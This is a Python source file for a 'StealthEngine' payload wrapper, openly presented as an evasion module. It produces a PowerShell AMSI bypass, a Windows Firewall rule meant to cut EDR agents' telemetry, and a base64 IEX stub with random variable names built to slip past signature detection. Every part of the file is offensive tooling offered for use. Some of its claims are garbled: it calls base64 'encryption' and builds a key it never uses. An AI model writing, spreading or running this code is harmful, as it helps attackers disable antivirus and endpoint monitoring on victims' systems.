import base64
import random
import string

class StealthEngine:
    """
    Advanced Evasion & Security Bypass Module for v5.1 Stealth Edition.
    Features: AMSI Bypassing, EDR Silencing (via Firewall), and Polymorphic Obfuscation.
    """

    @staticmethod
    def get_amsi_bypass():
        """
        Returns a polymorphic AMSI bypass string.
        Uses a memory-patching technique that doesn't rely on VirtualProtect.
        """
        # We obfuscate the strings to prevent static detection of the bypass itself
        a = "amsi"
        b = "Init"
        c = "Failed"
        # Polymorphic assembly of the bypass
        return f"$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(8); [System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes([long]0x00010003), 0, $mem, 8); [Ref].Assembly.GetType('System.Management.Automation.{a}Utils').GetField('{a}{b}{c}', 'NonPublic,Static').SetValue($null, $true);"

    @staticmethod
    def get_edr_silencer():
        """
        Generates commands to silence EDR telemetry by blocking common egress ports 
        used by security agents (SentinelOne, Crowdstrike, etc.) via Windows Firewall.
        """
        return 'New-NetFirewallRule -DisplayName "EDR-Block" -Direction Outbound -Action Block -RemotePort 443,80,8080 -Program "C:\\Program Files\\*"'

    def polymorphic_encrypt(self, code):
        """
        Encapsulates code in a polymorphic wrapper.
        Each generation uses a different key and variable naming scheme.
        """
        key = ''.join(random.choices(string.ascii_letters, k=16))
        encoded = base64.b64encode(code.encode()).decode()
        
        # This is a self-decrypting stub that looks different every time
        var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        stub = f"""
${var_name} = "{encoded}"
$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${var_name}))
IEX $dec
"""
        return stub

    def wrap_payload(self, original_payload):
        """
        Applies the full stealth suite to a payload.
        """
        stealth_payload = f"""
# v5.1 Stealth Suite Active
{self.get_amsi_bypass()}
{self.get_edr_silencer()}
{original_payload}
"""
        return self.polymorphic_encrypt(stealth_payload)

if __name__ == "__main__":
    engine = StealthEngine()
    test_payload = "Write-Host 'Target Compromised'"
    print(engine.wrap_payload(test_payload))
